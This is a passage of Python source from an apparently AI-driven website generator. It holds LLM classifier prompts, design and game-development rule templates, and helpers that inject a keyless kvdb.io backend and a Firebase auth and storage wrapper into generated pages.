        return _wants_multipage_cache[idea]
    prompt = """Does this website request explicitly call for multiple separate pages (e.g. a distinct About page, Contact page, Blog, product pages) that a visitor would navigate between via links — as opposed to one single scrolling page with sections?
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _wants_multipage_cache[idea] = result
    return result

def _idea_wants_backend(idea):
    """
    Classifies whether an idea needs real shared data persistence across
    visitors — a guestbook, public comments, a shared leaderboard, a
    poll/vote count, an RSVP/signup list that's displayed back on the
    page, or a collaborative list/board. Deliberately excludes plain
    contact/signup forms (those already get a working destination via
    wire_contact_forms/FormSubmit — a send-and-forget notification, not
    something that needs to be read back and rendered) and anything a
    single visitor's own localStorage already covers (a game high score,
    a to-do list only that visitor sees).
    """
    if idea in _wants_backend_cache:
        return _wants_backend_cache[idea]
    prompt = """Does this website need a real backend for storing and reading back data SHARED across visits/different visitors — e.g. a guestbook, public comments, a shared leaderboard, a poll/voting count, an RSVP or signup list that's displayed on the page, or a shared collaborative list/board?
Reply NO for a simple contact/signup form that just notifies the site owner (handled separately), and NO for anything that only needs a single visitor's own session/device (localStorage already covers that).
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _wants_backend_cache[idea] = result
    return result

def _idea_wants_auth(idea):
    """
    Classifies whether an idea needs real user accounts — login/signup,
    and data that's PRIVATE to each logged-in user (not the public shared
    data kvdb.io already covers). Things like "let members log in and see
    their own saved items", "a private journal app", "each user has their
    own dashboard". Deliberately excludes anything public/shared (that's
    _idea_wants_backend's territory) and anything not needing identity at
    all.
    """
    if idea in _wants_auth_cache:
        return _wants_auth_cache[idea]
    prompt = """Does this website need real user accounts — a visitor signs up/logs in, and then sees or manages data that's PRIVATE to just them (not visible to other visitors)? Examples: a members-only dashboard, a private journal/notes app, each user having their own saved items or settings.
Reply NO if the site has no login at all, or if any shared data is meant to be public to everyone (a guestbook, leaderboard, poll — that's a different kind of backend).
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _wants_auth_cache[idea] = result
    return result

def _idea_wants_file_upload(idea):
    """
    Classifies whether visitors need to upload real files/images
    themselves (a profile picture, a resume, photos to a gallery they
    populate) — as opposed to images the SITE shows that were generated
    via genimage: prompts. Only meaningful alongside real auth, since
    uploads need to be scoped to a user; see _idea_wants_auth.
    """
    if idea in _wants_file_upload_cache:
        return _wants_file_upload_cache[idea]
    prompt = """Does this website need VISITORS to upload their own real files (a profile picture, a resume/document, photos into a gallery they populate) — not images the site itself displays that were AI-generated for design purposes?
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _wants_file_upload_cache[idea] = result
    return result

def _idea_wants_payment(idea):
    """
    Classifies whether the site is selling something specific — a
    product, a course, a donation, a ticket — where a real "buy"/"pay"
    action makes sense, as opposed to a generic business site with no
    actual point-of-sale.
    """
    if idea in _wants_payment_cache:
        return _wants_payment_cache[idea]
    prompt = """Does this website need a real "buy now" / "pay" / "donate" action for a specific product, service, ticket, or donation — not just a generic contact form?
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _wants_payment_cache[idea] = result
    return result

def _idea_wants_teardown(idea):
    """
    Classifies whether this web idea is a "teardown" / interactive part
    explorer — ANY subject (mechanical, natural, biological, structural,
    astronomical, etc.) shown as clickable, labeled parts/layers that can
    be toggled or peeled away (e.g. "let me see the parts of a car",
    "explode view of an engine", "show me what's inside a laptop",
    "disassemble the earth", "layers of the human body", "cross-section
    of a plant cell", "what's inside a beehive") — as opposed to a normal
    marketing site or a playable game. Swaps in teardown_rules and forces
    the Three.js path on regardless of _idea_wants_3d, since a teardown is
    unusable without a real 3D scene. Deliberately NOT limited to
    mechanical/man-made objects — "disassemble X" for literally anything
    with internal structure (a planet, an organ, a molecule, a building)
    should qualify.
    """
    if idea in _wants_teardown_cache:
        return _wants_teardown_cache[idea]
    prompt = """Is this request asking to build an interactive "teardown" / part-explorer / exploded-view / disassembly tool — where SOME SUBJECT is shown in 3D with clickable/labeled parts and togglable layers, so someone can explore what's inside it, what it's made of, or how it's built — as opposed to a marketing site, dashboard, informational page, or playable game?
The subject can be absolutely anything with internal structure or distinct layers/parts, not just mechanical objects — for example: a vehicle or machine (car, engine, jet), a device (laptop, phone), a natural/celestial body (the earth, the sun, a planet's layers), a living thing or anatomy (the human body, a cell, a plant, an animal), a structure (a building, a bridge, a dam), or anything else someone might want "disassembled," "exploded," or "taken apart" to see its internal makeup. Words like "disassemble", "take apart", "explode view", "cross-section", "what's inside", "layers of", or "parts of" applied to ANY subject all count as YES.
Reply with ONLY: YES or NO
Idea: """ + idea
    result = ask_ai(prompt).strip().upper() == "YES"
    _wants_teardown_cache[idea] = result
    return result

def _senior_review_pass(idea, code, checklist, artifact_label, reply_instructions):
    """
    Second-pass self-critique used for games and videos: a first draft from
    an LLM regularly "checks every box" in the prompt while still missing
    the thing a human reviewer would flag in ten seconds (dead-feeling
    input, a transition that's really a hard cut, a difficulty curve that's
    flat). This mirrors what a professional team actually does — draft,
    then a reviewer pass against a checklist, then a revision — instead of
    shipping the first completion untouched. Returns the (possibly
    unchanged) revised code; falls back to the original on any AI/parsing
    failure so this can never make output worse than skipping the pass.
    """
    review_prompt = ("You are a senior reviewer doing a strict pre-ship code review of the "
        + artifact_label + " below, written for this request: " + idea + """

Checklist it must satisfy:
""" + checklist + """

Code under review:
""" + code + """

List only the checklist items that are genuinely NOT met (be specific and honest — "meets it" for something present but low-effort, e.g. a transition that's actually a hard cut, is a false pass). If everything is genuinely met, reply with exactly: PASS
Otherwise reply with a short bullet list of concrete gaps, nothing else.""")
    try:
        critique = ask_ai(review_prompt).strip()
    except Exception:
        return code
    if not critique or critique.upper().startswith("PASS"):
        return code
    fix_prompt = ("Revise this """ + artifact_label + """ to fix ONLY the gaps below — keep everything else that already works intact, don't regress passing functionality.

Gaps found by review:
""" + critique + """

Current code:
""" + code + """

""" + reply_instructions)
    try:
        revised = ask_ai(fix_prompt)
    except Exception:
        return code
    if not revised or revised.startswith("ERROR"):
        return code
    return revised

DESIGN_RULES = """
You are a senior award-winning web designer/creative developer in the style of top agency sites (the quality bar is Dora AI / Awwwards-level, not a generic template). This must look and function like a site a real studio shipped to a paying client, not a demo. Follow these standards:
- Visual design: confident, modern, intentional. Use a real color system (not default blues/grays) defined once as CSS variables, generous whitespace, a strong type scale (import 2 real Google Fonts — a distinctive display face + a clean body face — via <link>, never system-default fonts alone), and a distinctive look — avoid anything that reads as a Bootstrap/stock template.
- Content: write real, specific, finished copy for this idea — headlines, body text, CTAs, footer — with no "Lorem ipsum," no "[Placeholder]," no "Your text here." Every button/link must say what it does and go somewhere real on the page (a working #anchor section, a mailto:, or a tel:) — no href="#" dead links.
- Structure & semantics: use real HTML5 semantic tags (<header>, <nav>, <main>, <section>, <footer>) instead of an all-<div> soup — this isn't optional polish, it's what makes the page navigable and indexable. Include a working nav with smooth-scroll anchor links to the page's own sections.
- SEO/meta essentials: a real <title> specific to the idea (not "Document" or "My Site"), a <meta name="description">, an inline SVG or emoji favicon via <link rel="icon">, and <meta name="viewport" content="width=device-width, initial-scale=1">.
- Responsive: mobile-first with real breakpoints (use CSS clamp()/min()/max() or at least 2-3 @media queries) — test the layout mentally at 375px, 768px, and 1440px. A hamburger/collapsed nav on mobile if the desktop nav has more than 2-3 links. No horizontal scroll, no text/buttons that overflow or get cut off at narrow widths.
- Accessibility: every <img> needs a real, descriptive alt attribute (not alt=""), sufficient color contrast between text and background, a visible :focus-visible state on interactive elements (not outline:none with nothing replacing it), and touch targets at least ~44px tall on mobile.
- Motion: smooth scroll-based reveals and transitions. Use GSAP + ScrollTrigger (via CDN: https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js and ScrollTrigger plugin) for entrance animations, parallax, and scroll-linked effects. Avoid jarring or instant pop-ins, and respect prefers-reduced-motion by disabling non-essential animation for users who've set it.
- Interactivity: hover states, magnetic/responsive cursor effects where appropriate, and elements that respond to mouse movement or scroll position.
- Loading polish: a brief, tasteful fade/reveal on initial load rather than a flash of unstyled content; make sure the page has real visible content even before any JS/animation library finishes loading (progressive, not blank-until-JS).
- Images: where the content calls for real photography/art (hero shots, product/portfolio galleries, team/about sections), use <img src="genimage: a specific, vivid description of exactly what the image should show and in what style" alt="..."> — one genimage: tag per distinct image, with a real descriptive prompt (not a generic keyword). These get rendered by an AI image model and swapped in for the real hosted URL automatically before the site ships, so write the prompt as if briefing an illustrator/photographer, not a stock-photo search box. If image generation is ever unavailable, the pipeline falls back to a plain placeholder photo in the same slot automatically — don't add your own fallback logic or mention image generation in the on-page copy either way. Skip this entirely for ideas that genuinely don't need photography (a pure typography/data site, a tool UI).
- Performance discipline: prefer <script defer> or placing scripts at the end of <body> so nothing blocks initial paint; don't load libraries you don't actually use; keep the total page reasonably lean.
- Color scheme: define your CSS colors as variables and add a `@media (prefers-color-scheme: dark)` block that remaps them for dark mode — don't ship light-mode-only unless the idea specifically calls for one fixed theme.
- Forms: any contact/signup <form> should use method="POST" and either omit the action attribute entirely or point it at a real mailto: — a working form backend gets auto-wired onto it after generation as long as the action is left real-or-empty (not a fake JS-only "success" message with nowhere for the data to go, and not action="#").
- Don't claim things the page doesn't actually have — no "we respect your privacy" or "see our privacy policy" unless a real privacy/terms page or section actually exists and is linked."""

BACKEND_RULES = """
This site needs real shared data persistence across visitors. A keyless backend is already loaded on the page as global async functions — DO NOT implement your own fetch/localStorage backend and DO NOT redeclare these functions, just call them:
- await kvSet(key, value) — value can be any JSON-serializable object (string, number, or a plain object/array).
- await kvGet(key) — returns the stored value, or null if it doesn't exist yet.
- await kvDelete(key) — removes an entry.
- await kvList() — returns an array of {key, value} for every entry ever written via kvSet — use this to render a shared guestbook/leaderboard/list.
- kvWatch(callback, intervalMs) — like kvList but LIVE-ish: calls callback(items) immediately, then re-polls and calls it again every intervalMs (default 4000) so a guestbook/leaderboard updates for viewers without a manual refresh — this is a free keyless backend, so it's polling under the hood, not a true push; don't set intervalMs below ~2000. Returns a function you can call to stop polling.
Use a unique key per record for anything list-like (a guestbook entry, a poll vote, an RSVP), e.g. Date.now() + "_" + Math.random().toString(36).slice(2). Await every call, update the UI after it resolves, and handle null/empty results gracefully — show a real empty state (e.g. "No entries yet — be the first!"), never leave the UI blank or throw."""

def create_kvdb_bucket():
    """
    Creates a new anonymous kvdb.io key-value bucket — the entire point of
    kvdb.io is that this needs no signup and no API key/secret, just a
    single POST. Returns the bucket id (used to build
    https://kvdb.io/<bucket>/<key> URLs), or None if the service is
    unreachable — callers must treat None as "skip the backend for this
    build" rather than fail the whole site over it.
    """
    try:
        resp = requests.post("https://kvdb.io/", timeout=15)
        if resp.status_code in (200, 201):
            bucket_id = resp.text.strip()
            if bucket_id:
                return bucket_id
    except requests.exceptions.RequestException:
        pass
    return None

def inject_keyless_backend_library(html_code, bucket_id, owner_email=None):
    """
    Injects a small vanilla-JS library exposing kvSet/kvGet/kvDelete/
    kvList/kvWatch async functions backed by a real kvdb.io bucket — a
    genuinely keyless backend (no signup, no API key, just a bucket id
    baked into the URL) — plus notifyOwner (a FormSubmit-relayed email)
    if owner_email is given. Injected before </head> so it's available to
    every other <script> on the page. Idempotent (checks for the function
    already being present) so re-running an edit through write_patch_for_web
    never double-injects it.
    NOTE: kvList()'s index (the "_index" key tracking which keys exist) is
    read-modify-written on every kvSet/kvDelete with no locking — fine for
    the low-traffic sites this pipeline ships, but two truly simultaneous
    writers could each overwrite the other's index update. A known,
    acceptable tradeoff for a free, keyless, zero-infra backend. kvWatch is
    polling (kvdb.io has no push/websocket capability), not true real-time.
    """
    if "function kvSet" in html_code:
        return html_code
    base = "https://kvdb.io/" + bucket_id + "/"
    notify_fn = ("""async function notifyOwner(subject, message) {
  try {
    await fetch("https://formsubmit.co/ajax/""" + (owner_email or "") + """", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ _subject: subject, message: message })
    });
  } catch (e) {}
}
""") if owner_email else ""
    library = ("<script>\nconst _KV_BASE = \"" + base + "\";\n" + """async function kvSet(key, value) {
  await fetch(_KV_BASE + encodeURIComponent(key), { method: "POST", body: JSON.stringify(value) });
  const idx = (await kvGet("_index")) || [];
  if (!idx.includes(key)) {
    idx.push(key);
    await fetch(_KV_BASE + "_index", { method: "POST", body: JSON.stringify(idx) });
  }
}
async function kvGet(key) {
  try {
    const r = await fetch(_KV_BASE + encodeURIComponent(key));
    if (!r.ok) return null;
    const t = await r.text();
    if (!t) return null;
    try { return JSON.parse(t); } catch (e) { return t; }
  } catch (e) { return null; }
}
async function kvDelete(key) {
  try { await fetch(_KV_BASE + encodeURIComponent(key), { method: "DELETE" }); } catch (e) {}
  const idx = (await kvGet("_index")) || [];
  const next = idx.filter(k => k !== key);
  await fetch(_KV_BASE + "_index", { method: "POST", body: JSON.stringify(next) });
}
async function kvList() {
  const idx = (await kvGet("_index")) || [];
  const values = await Promise.all(idx.map(k => kvGet(k)));
  return idx.map((k, i) => ({ key: k, value: values[i] })).filter(e => e.value !== null);
}
function kvWatch(callback, intervalMs) {
  intervalMs = intervalMs || 4000;
  let stopped = false;
  const tick = async () => { if (!stopped) callback(await kvList()); };
  tick();
  const id = setInterval(tick, intervalMs);
  return () => { stopped = true; clearInterval(id); };
}
""" + notify_fn + """</script>
""")
    return _inject_before_head_close(html_code, library)

AUTH_RULES = """
This site needs real user accounts with private per-user data. Firebase Auth + Firestore are already loaded on the page as global functions — DO NOT implement your own auth/database, DO NOT redeclare these, just call them:
- await authSignUp(email, password) — creates an account, returns {ok, error}.
- await authSignIn(email, password) — logs in, returns {ok, error}.
- await authSignOut() — logs out.
- authOnChange(callback) — callback(user) fires immediately and again on every login/logout; user is null when logged out, otherwise has .uid and .email. Use this to show/hide logged-in vs logged-out UI — don't assume login state, always react to this.
- await dbSet(path, data) — saves data PRIVATE to the current user (data can be any JSON-serializable object). Throws if nobody is logged in — only call after authOnChange confirms a user. For anything list-like (journal entries, saved items), use a path like "collectionName/uniqueId" (e.g. "journal/" + Date.now()) so dbList can find it.
- await dbGet(path) — returns that user's saved value at path, or null.
- await dbList(collectionName) — returns an array of {id, data} for every item saved under paths starting with "collectionName/" (id is the part after the slash) — e.g. dbList("journal") after saving with dbSet("journal/123", ...).
- await dbDelete(path) — removes an entry (use the full path, e.g. "journal/123").
- dbWatch(collectionName, callback) — like dbList but LIVE: callback(items) fires immediately with the current array, then again automatically whenever any item under that collection changes (anywhere, by any user viewing the same collection concept if your data model allows it, otherwise just the current user's own list updating in real time). Use this instead of dbList for anything that should feel live without a manual refresh. Returns an unsubscribe function — call it if the UI showing that list is removed/torn down.
Build a real signup/login form (email + password fields), a logged-out state (shows the auth form, nothing private), and a logged-in state (shows the user's private data, a logout button). Handle auth errors from authSignUp/authSignIn by showing the message to the user, not just console-logging it."""

STORAGE_RULES = """
Visitors need to upload real files (not AI-generated images — use genimage: for those). A file-upload helper is already loaded as a global function:
- await uploadFile(path, fileInputElement.files[0]) — uploads the given File object, PRIVATE to the current logged-in user, and returns its public download URL (a string) once done. Throws if nobody is logged in. Use a path like "avatars/photo.jpg" or "gallery/" + Date.now() + "_" + file.name.
- await deleteFile(path) — removes an uploaded file.
Use a real <input type="file"> element, show upload progress/a loading state (uploads can take a moment), and display the returned URL (e.g. set it as an <img src>) once resolved. Handle upload errors by showing a message, not just console-logging."""

NOTIFY_RULES = """
A "notify the site owner" helper is already loaded as a global function: await notifyOwner(subject, message) — sends a real email to the site owner (fire-and-forget, don't await its result in a way that blocks the UI). Call this after meaningful backend events worth knowing about without checking the site manually — a new signup, a new guestbook/comment entry, a new order. Don't call it for routine reads or for every keystroke — only on real new-record creation."""

def inject_firebase_auth_library(html_code, firebase_config, owner_email=None):
    """
    Injects the Firebase SDK (via CDN) plus a small wrapper library exposing
    authSignUp/authSignIn/authSignOut/authOnChange, dbSet/dbGet/dbList/
    dbDelete/dbWatch (Firestore, scoped to `users/{uid}/data/{path}` so each
    user's data is automatically private to them), uploadFile/deleteFile
    (Firebase Storage, scoped to `users/{uid}/...`), and — if owner_email is
    given — notifyOwner (a FormSubmit-relayed email, same free relay the
    contact-form wiring already uses). firebase_config is the project's
    public web config (apiKey, authDomain, projectId, etc) — not a
    traditional secret; it's meant to be embedded client-side and is
    protected by Firestore/Storage security rules rather than by being
    hidden. Free forever on Firebase's Spark plan. Idempotent — checks for
    the library already being present so an edit pass never double-injects it.
    """
    if "function authSignUp" in html_code:
        return html_code
    config_json = json.dumps(firebase_config)
    notify_fn = ("""window.notifyOwner = async (subject, message) => {
  try {
    await fetch("https://formsubmit.co/ajax/""" + (owner_email or "") + """", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ _subject: subject, message: message })
    });
  } catch (e) {}
};
""") if owner_email else ""
    library = ("""<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
import { getFirestore, doc, setDoc, getDoc, deleteDoc, collection, getDocs, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";
import { getStorage, ref, uploadBytes, getDownloadURL, deleteObject } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-storage.js";

const _fbApp = initializeApp(""" + config_json + """);
const _auth = getAuth(_fbApp);
const _db = getFirestore(_fbApp);
const _storage = getStorage(_fbApp);

window.authSignUp = async (email, password) => {
  try { await createUserWithEmailAndPassword(_auth, email, password); return { ok: true }; }
  catch (e) { return { ok: false, error: e.message }; }
};
window.authSignIn = async (email, password) => {
  try { await signInWithEmailAndPassword(_auth, email, password); return { ok: true }; }
  catch (e) { return { ok: false, error: e.message }; }
};
window.authSignOut = async () => { await signOut(_auth); };
window.authOnChange = (callback) => onAuthStateChanged(_auth, (user) => callback(user ? { uid: user.uid, email: user.email } : null));

function _requireUid() {
  const u = _auth.currentUser;
  if (!u) throw new Error("Not logged in");
  return u.uid;
}
window.dbSet = async (path, data) => setDoc(doc(_db, "users", _requireUid(), "data", path), { value: data });
window.dbGet = async (path) => {
  const snap = await getDoc(doc(_db, "users", _requireUid(), "data", path));
  return snap.exists() ? snap.data().value : null;
};
window.dbDelete = async (path) => deleteDoc(doc(_db, "users", _requireUid(), "data", path));
window.dbList = async (collectionName) => {
  const snap = await getDocs(collection(_db, "users", _requireUid(), "data"));
  const prefix = collectionName + "/";
  return snap.docs
    .filter(d => d.id.startsWith(prefix))
    .map(d => ({ id: d.id.slice(prefix.length), data: d.data().value }));
};
window.dbWatch = (collectionName, callback) => {
  const prefix = collectionName + "/";
  return onSnapshot(collection(_db, "users", _requireUid(), "data"), (snap) => {
    const items = snap.docs
      .filter(d => d.id.startsWith(prefix))
      .map(d => ({ id: d.id.slice(prefix.length), data: d.data().value }));
    callback(items);
  });
};
window.uploadFile = async (path, file) => {
  const fileRef = ref(_storage, "users/" + _requireUid() + "/" + path);
  await uploadBytes(fileRef, file);
  return getDownloadURL(fileRef);
};
window.deleteFile = async (path) => deleteObject(ref(_storage, "users/" + _requireUid() + "/" + path));
""" + notify_fn + """</script>
""")
    return _inject_before_head_close(html_code, library)

STORAGE_SETUP_RULES_TEXT = """rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /users/{userId}/{allPaths=**} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }
  }
}"""

FIRESTORE_SETUP_RULES_TEXT = """rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /users/{userId}/data/{document=**} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }
  }
}"""

DESIGN_SYSTEM_FILE = workpath("web_design_system.json")

def load_design_system():
    return read_json_file(DESIGN_SYSTEM_FILE, None)

def save_design_system_from_html(html_code):
    """
    Extracts the CSS custom-property palette (the :root {...} block) and
    any Google Fonts <link> imports from a successfully-shipped
    professional site and stores them as this agent's reusable 'house
    style' — so future sites default to a consistent look and the writer
    model has less to invent (and fewer tokens spent re-deciding) from
    scratch every time. Pure regex, no AI call. Only saved once: the
    FIRST successful professional-site build establishes it, and this
    never silently overwrites an existing house style afterward — that
    would drift the look across unrelated future builds without anyone
    asking for it. Use 'resetstyle' to clear it and let the next build
    establish a new one.
    """
    if load_design_system():
        return
    root_match = re.search(r":root\s*{([^}]*)}", html_code, re.IGNORECASE | re.DOTALL)
    variables = root_match.group(1).strip() if root_match else ""
    if not variables:
        return
    font_links = re.findall(r'<link[^>]+fonts\.googleapis\.com[^>]*>', html_code, re.IGNORECASE)
    write_file(DESIGN_SYSTEM_FILE, json.dumps({"css_variables": variables, "font_links": font_links}, indent=2))

def design_system_hint():
    system = load_design_system()
    if not system or not system.get("css_variables"):
        return ""
    hint = ("\n\nHouse style already established from a previous site — reuse these exact CSS variables and fonts "
            "unless the idea specifically calls for a different look:\n:root {\n" + system["css_variables"] + "\n}\n")
    if system.get("font_links"):
        hint += "\n".join(system["font_links"]) + "\n"
    return hint

def write_code_for_web(idea, previous_error="", kvdb_bucket=None, firebase_config=None, wants_payment=False, wants_file_upload=False):
    lessons = load_lessons()
    lessons_block = (("\n\nLessons:\n" + lessons) if lessons else "") + design_system_hint()
    base_rules = """Write ONE complete self-contained HTML file. All CSS in <style>, all JS in <script>.
CDNs are fine. Page must run immediately in a browser with no setup."""

    design_rules = DESIGN_RULES

    threejs_rules = """
This site should include a real interactive 3D scene built with Three.js (CDN: https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js). Requirements:
- A <canvas> with a working WebGL scene (camera, lighting — at least one ambient + one directional/point light — and material(s) appropriate to the idea).
- Animate the scene with requestAnimationFrame (e.g. gentle rotation, floating motion, or particles).
- Tie the 3D scene into the page: scroll-driven camera movement or object transforms (e.g. moving camera.position or object rotation based on scroll/mouse position) so it feels integrated, not a decoration bolted on.
- Handle window resize (update camera aspect + renderer size).
- Wrap Three.js setup in a DOMContentLoaded listener and guard against errors so a WebGL failure doesn't break the rest of the page."""

    game_dev_rules = """
You are a senior game developer shipping a polished, professional-feel browser game (the bar is a well-made itch.io/arcade release — the kind another game developer would inspect the source of and say "this is properly built" — not a coding-tutorial demo). Follow these standards:
- Architecture: use an HTML5 <canvas> with a proper fixed-timestep-style game loop driven by requestAnimationFrame, delta-time based movement (never assume a fixed frame rate, clamp deltaTime to avoid spiral-of-death after tab-switch), and a clear separation between update logic and rendering. Structure state as a simple state machine: MENU -> PLAYING -> PAUSED -> GAME_OVER (and WIN if applicable), not a tangle of global flags. Keep entities as small objects/classes with their own update/draw rather than one giant loop with inline logic for everything.
- Core loop: define a clear objective, a fail condition, and a win/score condition. Include real difficulty progression (speed/spawn-rate/level increases) tuned as a curve (ramps up, doesn't spike or flatline) rather than a static, unchanging challenge. First 5-10 seconds should be easy enough to teach the mechanic without a tutorial popup.
- Controls: keyboard (arrow keys/WASD + relevant action keys) AND touch/pointer support for mobile, with on-screen touch controls or swipe/tap handling if keyboard-only would leave mobile players stuck. Prevent default browser behavior for game keys (e.g. arrow-key page scrolling). Input should feel responsive — read input every frame, not just on keydown, for anything requiring held movement.
- Collision & physics: real collision detection appropriate to the genre (AABB rect overlap, circle distance, or tile-based) — not just visual overlap assumptions. Basic physics (gravity, velocity, friction) if the genre calls for it (platformer, etc.) should feel weighty and tuned, not floaty/broken. Use small forgiveness touches where genre-appropriate (coyote time for jumps, slight input buffering) — these are what separate "playable" from "feels good."
- Feedback & juice: visible score/lives/level HUD, a start screen, a pause overlay, and a game-over/win screen with a "play again" action that fully resets state (no stale variables/listeners causing bugs on replay). Add small polish touches — screen shake, particle bursts, flash/tween on hit, ease-in/ease-out on UI transitions, or simple squash-and-stretch — so it doesn't feel static. Every player action (hit, score, death) should have an immediate visual and/or audio response within a frame or two — silence on impact reads as broken, not calm.
- Audio: simple sound effects and/or background music generated via the Web Audio API (oscillator/gain nodes) so no external asset files are needed — mute/volume control if music loops. Distinct, short SFX for the 3-4 most frequent events (hit, score, jump/action, game-over) matter more than a music track.
- Persistence: store high score in localStorage and display best score alongside current score.
- Accessibility & clarity: sufficient color contrast for key game elements (don't rely on red/green alone to distinguish danger vs safe), readable font sizes at typical viewing distance, and a visible on-screen legend/instructions for controls (shown on the start screen, not just assumed knowledge).
- Responsiveness: canvas should scale to fit the viewport (maintaining aspect ratio) and remain playable on both desktop and mobile screen sizes.
- Robustness: no console errors, no unhandled exceptions in the update/render loop, and the game must be fully playable start-to-finish with only mouse/keyboard/touch — no external asset downloads, no server, no build step."""

    environment_rules = """
This scene includes an outdoor natural environment, so a flat colored plane with static geometry is not acceptable. Implement:
- Wind-driven foliage: give tree/foliage vertex shaders (or per-vertex JS displacement if not using custom shaders) a sway driven by a time-varying wind-strength and wind-direction value, not a fixed idle animation — bigger sway at branch tips than trunk base.
- Wind audio: a continuous ambient wind bed built from filtered noise (Web Audio API BufferSource + BiquadFilter, or an oscillator bank), with volume/filter cutoff tied to the same wind-strength value so it's audibly connected to what's visually swaying.
- Footstep audio: trigger short footstep sounds on a timer keyed to the player's actual movement speed/state (idle = silent, walk = slower cadence, run = faster cadence) — never silent while the player is moving.
- Water (if present): a shader or per-frame technique that gives visible motion (scrolling/rippling normal map, sine-displaced vertices, or a reflection approximation) — not a static flat-colored rectangle.
- Terrain (if present): height variation (heightmap-driven or procedural noise-based geometry) for mountains/hills rather than a flat ground plane, with a matching low-poly/stylized material rather than one solid color."""

    teardown_rules = """
You are building an interactive "teardown" / part-explorer / disassembly tool: a 3D subject that someone can rotate, zoom into, and take apart layer by layer to see how it's built or what's inside it. The subject can be ANYTHING with internal structure — a vehicle or machine, a device, a natural/celestial body (a planet's crust/mantle/core, a star's layers), a living thing or anatomy (a body's organ systems, a cell's organelles, a plant's tissue layers), a structure (a building's floors, a dam's cross-section), or anything else — don't default to mechanical/vehicle framing unless the subject actually is one. Follow these standards:
- Model source (two paths, both must work for ANY subject — a file is never required):
  1. Real model (optional, for whoever has one): include <script src="https://unpkg.com/three@0.128.0/examples/js/loaders/GLTFLoader.js"></script> after the core Three.js script. Add a file picker (accept=".glb,.gltf") and a drag-and-drop zone. When the user provides a file, load it with THREE.GLTFLoader via URL.createObjectURL(file), add the loaded scene to the Three.js scene, compute its bounding box (THREE.Box3), auto-center it at the origin, and position/frame the camera to fit it regardless of the model's original scale or units.
  2. Procedural fallback (the default — this is what nearly everyone will see, for any subject, with zero file needed): build the subject out of Three.js primitives (SphereGeometry for planets/cells/organs, BoxGeometry/CylinderGeometry for machines/buildings/devices, etc.) grouped into named sub-assemblies that make sense FOR THIS SPECIFIC SUBJECT (e.g. "crust / mantle / outer core / inner core" for a planet, "epidermis / dermis / subcutaneous" for skin, "body shell / chassis / engine / interior" for a car, "floors / structural frame / foundation" for a building) — pick real, subject-appropriate layer names, never generic placeholders like "Layer 1". This must look intentional and complete on its own, not like a placeholder.
  3. Make the mode switch obvious in the UI: a clearly labeled "Load your own model" control (for anyone who happens to have one), and a note that without one they're viewing a generic stylized demo of THIS subject, not a real scan of a specific physical object.
- Layers/parts:
  - Procedural mode: put each sub-assembly in its own THREE.Group, with a row of layer-toggle buttons (bottom or side, touch-friendly, horizontally scrollable) to show/hide each independently. Exactly one layer (the outermost one) visible by default.
  - Loaded-model mode: after loading, traverse the glTF scene graph and build the same kind of toggle list from the top-level named nodes/groups in the file (fall back to "Part 1", "Part 2"... if a node has no name) — do not assume fixed layer names since real files vary. Also add raycasting on tap/click: hitting a mesh shows its node name in an info card so someone can identify parts even when the model isn't pre-labeled.
- Hotspots (procedural mode only, since a loaded model's real part semantics are unknown): a handful of clickable/tappable markers per layer (small pulsing dots positioned via camera projection of a 3D point, updated every frame). Tapping opens a small info card (title + 1-2 sentence plain-language explanation of that specific layer/part for THIS subject). Hide a layer's hotspots when that layer is hidden.
- Camera: orbit controls that work with both mouse drag and single-finger touch drag, plus scroll-wheel and pinch-to-zoom on mobile. Clamp zoom distance and vertical angle so the camera can't clip through the ground or flip upside down. Slow idle auto-rotate when not interacting, paused on interaction.
- Framing: light the subject clearly (ambient/hemisphere fill + a directional key light with shadows) against an uncluttered background (dark neutral or subtle grid) so geometry and labels stay legible.
- Honesty: since procedural mode is a generic/stylized model rather than a real scanned object, don't claim exact real-world accuracy in its UI copy — frame it as an explorable demo/schematic of this subject, and reserve "accurate" language for when a real file has actually been loaded."""

    is_game = _idea_wants_game(idea)
    is_teardown = (not is_game) and _idea_wants_teardown(idea)
    wants_environment = any(w in idea.lower() for w in
                             ["forest", "mountain", "outdoor", "wind", "water", "lake", "river", "nature", "trees"])
    if is_game:
        extra_rules = game_dev_rules + (threejs_rules if _idea_wants_3d(idea) else "")
    elif is_teardown:
        print("Detected this as a teardown/part-explorer — using teardown rules and forcing the 3D path on.")
        extra_rules = design_rules + threejs_rules + teardown_rules
    else:
        extra_rules = design_rules + (threejs_rules if _idea_wants_3d(idea) else "")
    if wants_environment:
        extra_rules += environment_rules
    if kvdb_bucket:
        extra_rules += BACKEND_RULES
    if firebase_config:
        extra_rules += AUTH_RULES
        if wants_file_upload:
            extra_rules += STORAGE_RULES
    if wants_payment:
        extra_rules += PAYMENT_RULES
    if (kvdb_bucket or firebase_config) and os.environ.get("AGENT_EMAIL"):
        extra_rules += NOTIFY_RULES

    if previous_error:
        prompt = """Write a self-contained HTML file for: """ + idea + """
Previous attempt failed: """ + previous_error + """
Fix the ROOT CAUSE. """ + base_rules + extra_rules + lessons_block + """
Reply with ONLY the HTML, no markdown fences."""
    else:
        prompt = """Write a self-contained HTML file for: """ + idea + """
